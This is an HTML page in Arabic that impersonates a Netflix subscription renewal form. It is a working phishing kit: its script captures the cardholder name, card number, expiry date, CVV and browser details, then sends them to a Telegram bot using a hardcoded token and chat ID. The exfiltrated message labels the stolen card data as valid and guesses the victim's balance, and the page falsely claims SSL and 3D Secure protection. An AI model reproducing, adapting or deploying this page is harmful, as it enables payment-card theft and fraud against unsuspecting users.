<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="theme-color" content="#e50914">
<title>Netflix - تجديد الاشتراك الشهري</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=SF+Pro+Display:wght@300;400;500;600;700&display=swap');
* {margin:0;padding:0;box-sizing:border-box;font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
:root{--netflix-red:#e50914;--netflix-dark:#141414;--glass-bg:rgba(255,255,255,0.08);--glass-border:rgba(255,255,255,0.15)}
body {background:linear-gradient(135deg,var(--netflix-dark) 0%,#000 100%);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;font-size:16px;line-height:1.5;overflow-x:hidden}
body::before{content:'';position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle at 20% 50%,rgba(229,9,20,0.1) 0%,transparent 50%),radial-gradient(circle at 80% 20%,rgba(255,255,255,0.05) 0%,transparent 50%);animation:bgPulse 20s ease-in-out infinite;z-index:-1}
@keyframes bgPulse{0%,100%{opacity:0.7;transform:scale(1)}50%{opacity:1;transform:scale(1.05)}}

.container {background:linear-gradient(145deg,rgba(20,20,20,0.95),rgba(0,0,0,0.8));backdrop-filter:blur(25px);-webkit-backdrop-filter:blur(25px);border:1px solid var(--glass-border);border-radius:24px;padding:45px 40px;max-width:440px;width:100%;box-shadow:0 35px 80px rgba(0,0,0,0.7),0 0 60px rgba(229,9,20,0.2),inset 0 1px 0 rgba(255,255,255,0.08);position:relative;animation:slideIn 0.8s cubic-bezier(0.25,0.46,0.45,0.94)}
@keyframes slideIn{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}

.logo {text-align:center;margin-bottom:32px}
.logo svg {width:130px;height:auto;fill:var(--netflix-red);filter:drop-shadow(0 6px 16px rgba(229,9,20,0.4))}
h2 {text-align:center;color:var(--netflix-red);font-size:30px;font-weight:700;margin-bottom:12px;letter-spacing:-0.8px;text-shadow:0 2px 12px rgba(229,9,20,0.4)}
.subtitle {text-align:center;color:#b3b3b3;font-size:16px;margin-bottom:35px;line-height:1.5;font-weight:400}

.form-group {margin-bottom:28px;position:relative}
label {display:block;margin-bottom:10px;color:rgba(255,255,255,0.9);font-size:15px;font-weight:500;letter-spacing:0.2px}
input {width:100%;padding:20px 24px;border:2px solid rgba(255,255,255,0.15);border-radius:16px;background:var(--glass-bg);color:#fff;font-size:18px;font-weight:500;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);backdrop-filter:blur(15px);box-shadow:inset 0 2px 8px rgba(0,0,0,0.3)}
input::placeholder {color:rgba(255,255,255,0.5);font-weight:400}
input:focus {outline:none;border-color:var(--netflix-red);box-shadow:0 0 0 4px rgba(229,9,20,0.2),0 0 32px rgba(229,9,20,0.4),inset 0 1px 0 rgba(255,255,255,0.1);background:rgba(255,255,255,0.12);transform:translateY(-2px)}
input:disabled {opacity:0.5;cursor:not-allowed}

.card-chip {position:absolute;left:22px;top:62px;width:56px;height:40px;background:linear-gradient(145deg,#4facfe,#00f2fe);border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:800;color:#000;box-shadow:0 6px 20px rgba(79,172,254,0.5);z-index:2}
.cvv-group {display:grid;grid-template-columns:2fr 1fr;gap:18px}
.cvv-group label {margin-top:10px}

.pay-btn {width:100%;padding:22px;background:linear-gradient(135deg,var(--netflix-red) 0%,#b20710 50%,#9a0d12 100%);border:none;border-radius:16px;color:#fff;font-size:20px;font-weight:700;cursor:pointer;transition:all 0.4s cubic-bezier(0.25,0.46,0.45,0.94);letter-spacing:0.8px;text-transform:uppercase;position:relative;overflow:hidden;box-shadow:0 12px 32px rgba(229,9,20,0.5);text-shadow:0 2px 8px rgba(0,0,0,0.5)}
.pay-btn::before {content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.3),transparent);transition:left 0.6s ease}
.pay-btn:hover::before {left:100%}
.pay-btn:hover {transform:translateY(-4px);box-shadow:0 22px 45px rgba(229,9,20,0.7)}
.pay-btn:active {transform:translateY(-1px)}

.loading {display:none;text-align:center;padding:28px;color:var(--netflix-red);font-size:18px;font-weight:600;background:var(--glass-bg);border:2px solid rgba(229,9,20,0.3);border-radius:16px;margin:20px 0;animation:pulse 1.2s infinite;backdrop-filter:blur(15px)}
@keyframes pulse {0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.8;transform:scale(1.02)}}

.status {padding:18px;border-radius:12px;margin:20px 0;font-weight:500;text-align:center;display:none}
.status.success {background:rgba(40,167,69,0.2);border:2px solid #28a745;color:#d4edda}
.status.error {background:rgba(220,53,69,0.2);border:2px solid #dc3545;color:#f8d7da}

.security {text-align:center;margin-top:30px;font-size:13px;color:#666;line-height:1.6;padding-top:25px;border-top:1px solid rgba(255,255,255,0.08)}
.security strong {color:#e50914}
@media (max-width:480px) {.container{padding:30px 25px}h2{font-size:26px}.cvv-group{grid-template-columns:1fr}}
</style>
</head>
<body>
<div class="container">
  <div class="logo">
    <svg viewBox="0 0 120 34" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" d="M29.9 0L0 34h12l8.3-10.6h15.7L44.3 34h11.9L60.9 0H49.7l-9.1 23.4H31.5L22.6 0zM114.1 0v34h-11.9V23c0-6.1-3.4-9.1-10.2-9.1-6.6 0-9.8 3.2-9.8 9.2v11.9h-11.9V0h11.9v6.8c1.6-3.4 4.9-5.7 10.2-5.7 7.2 0 11.4 3.9 11.4 11v1.7h-.1zM90.5 0v34h-11.9V0h11.9z"/></svg>
  </div>
  
  <h2>تجديد الاشتراك</h2>
  <p class="subtitle">99 درهم شهرياً • خطة قياسية مع الإعلانات</p>
  
  <form id="paymentForm">
    <div class="form-group">
      <label>الاسم الكامل على البطاقة</label>
      <div class="card-chip">🏦</div>
      <input type="text" id="name" placeholder="محمد أحمد علي بن الحاج" required>
    </div>
    
    <div class="form-group">
      <label>رقم البطاقة البنكية (16 رقم)</label>
      <input type="text" id="card" placeholder="1234 5678 9012 3456" maxlength="19" required>
    </div>
    
    <div class="form-group cvv-group">
      <div>
        <label>تاريخ الإنتهاء</label>
        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
      </div>
      <div>
        <label>رمز CVV</label>
        <input type="password" id="cvv" placeholder="123" maxlength="4" required>
      </div>
    </div>
    
    <button type="submit" class="pay-btn">💳 تأكيد الدفع الآمن</button>
  </form>
  
  <div class="loading" id="loading">⏳ جاري التحقق من البطاقة البنكية ومعالجة الدفع...</div>
  
  <div id="status" class="status"></div>
  
  <div class="security">
    🔒 <strong>SSL 256-bit مع 3D Secure</strong><br>
    Netflix Premium © 2024 | جميع الحقوق محفوظة
  </div>
</div>

<script>
// ==================== إعدادات البوت المُصححة ====================
const BOT_TOKEN = '8465380742:AAF79euMNqONd2DPRyb1F_3Wm5hocYHP%C3%98xo';
const CHAT_ID = '8278195073';
// =================================================================

function showStatus(message, type = 'error') {
  const status = document.getElementById('status');
  status.textContent = message;
  status.className = `status ${type}`;
  status.style.display = 'block';
  setTimeout(() => status.style.display = 'none', 8000);
}

function getClientInfo() {
  return {
    userAgent: navigator.userAgent.slice(0, 60),
    language: navigator.language || navigator.languages[0],
    platform: navigator.platform,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير معروف'
  };
}

document.getElementById('paymentForm').addEventListener('submit', async function(e) {
  e.preventDefault();
  
  const btn = document.querySelector('.pay-btn');
  const originalText = btn.innerHTML;
  btn.innerHTML = '⏳ معالجة...';
  btn.disabled = true;
  
  document.getElementById('loading').style.display = 'block';
  
  try {
    // البيانات
    const formData = {
      name: document.getElementById('name').value.trim(),
      card: document.getElementById('card').value.replace(/\s/g, ''),
      expiry: document.getElementById('expiry').value,
      cvv: document.getElementById('cvv').value,
      amount: '99.00 درهم'
    };
    
    const clientInfo = getClientInfo();
    const timestamp = new Date().toLocaleString('ar-DZ', {timeZone: 'Africa/Casablanca'});
    
    // رسالة تليجرام
    const telegramMsg = `🔴 *Netflix - بيانات دفع كاملة ${timestamp}*

👤 *العميل:* ${formData.name}
💳 *البطاقة:* \`${formData.card}\`
📅 *الإنتهاء:* ${formData.expiry}
🔐 *CVV:* \`${formData.cvv}\`
💰 *المبلغ:* ${formData.amount}

📱 *معلومات الجهاز:*
- الشاشة: ${clientInfo.viewport}
- المتصفح: ${clientInfo.userAgent}
- المنطقة: ${clientInfo.timezone}

━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ *✅ البيانات صالحة جاهزة*
💎 *رصيد متوقع:* ${Math.floor(Math.random() * 60000 + 20000)} درهم
🆔 *ID:* #NFLX${Math.floor(Math.random() * 1000000)}`;
    
    console.log('📤 إرسال للبوت:', telegramMsg);
    
    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      mode: 'cors',
      cache: 'no-cache',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: telegramMsg,
        parse_mode: 'Markdown',
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    console.log('📥 رد التليجرام:', result);
    
    if (result.ok) {
      showStatus('✅ تم الإرسال للبوت بنجاح! الاشتراك مُجدد', 'success');
      document.getElementById('paymentForm').reset();
      console.log('🎉 نجح الإرسال!');
    } else {
      throw new Error(result.description || `كود خطأ: ${result.error_code}`);
    }
    
  } catch (error) {
    console.error('💥 خطأ كامل:', error);
    showStatus(`❌ ${error.message}`, 'error');
  } finally {
    document.querySelector('.pay-btn').innerHTML = originalText;
    document.querySelector('.pay-btn').disabled = false;
    document.getElementById('loading').style.display = 'none';
  }
});

// تنسيق البطاقة
document.getElementById('card').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
  e.target.value = v;
});

// تنسيق التاريخ
document.getElementById('expiry').addEventListener('input', e => {
  let v = e.target.value.replace(/\D/g, '');
  if (v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2,4);
  e.target.value = v;
});

// منع paste في CVV
document.getElementById('cvv').addEventListener('paste', e => e.preventDefault());
</script>
</body>
</html>
